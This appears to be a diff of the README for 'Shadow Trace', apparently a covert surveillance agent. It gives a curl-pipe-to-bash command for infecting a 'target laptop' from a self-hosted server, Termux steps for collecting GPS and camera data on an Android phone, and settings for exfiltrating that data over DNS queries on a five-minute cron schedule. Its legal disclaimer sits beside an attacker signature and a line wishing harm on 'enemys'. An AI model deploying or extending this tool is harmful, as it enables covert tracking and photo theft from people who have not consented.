@@ -61,17 +61,17 @@ cd server
 ```
  ## Deploying the Agent
 **Linux Laptop**
-Host agent.sh on your server (e.g., with python3 -m http.server 8080 from the agent folder).
-On the target laptop, execute:
-ON LAPTOP EXECUTE....
+- Host agent.sh on your server (e.g., with python3 -m http.server 8080 from the agent folder).
+- On the target laptop, execute:
+- ON LAPTOP EXECUTE....
 ```bash
 `curl -sL http://youromain.com:8080/agent.sh | bash`
 ```
 
 
 # Android Phone (via Termux)
-Install Termux from F-Droid and then Termux:API (for GPS & camera).
-Insite Termux, install needed packages:
+- Install Termux from F-Droid and then Termux:API (for GPS & camera).
+- Insite Termux, install needed packages:
 ```bash
 
 pkg install termux-api curl jq dnsutils
@@ -92,9 +92,9 @@ Grant GPS and camera permissions when the prompt appears.
 
 
 ## Customization
-** Replace al occurrences of track.youromain.com with your domain inside `agent.sh` and `dnslistener.py`.
-To change the exfil interval, adjust the cron entry inside `agent.sh` (default `*/5 * * * *`).
-To store more data, increase the `head -c 200` of the photo fragment (up to about 2000 characters per DNS query is possible but reliability may drop).
+1. Replace al occurrences of track.youromain.com with your domain inside `agent.sh` and `dnslistener.py`.
+2. To change the exfil interval, adjust the cron entry inside `agent.sh` (default `*/5 * * * *`).
+3. To store more data, increase the `head -c 200` of the photo fragment (up to about 2000 characters per DNS query is possible but reliability may drop).
 ---■
 ## Disclimer (Legal)
 This software is provided for education and research purposes ony. The author is not responsable for any illegal use. By using Shadow Trace, you agre to only deploy it on devices you own or have explicit permission to monitor.
@@ -104,7 +104,7 @@ This software is provided for education and research purposes ony. The author is
 HACKER THE_MANSSS
 
 ## Shoutout
-# May your enemys never see the light. 
+ May your enemys never see the light. 
 
 
 
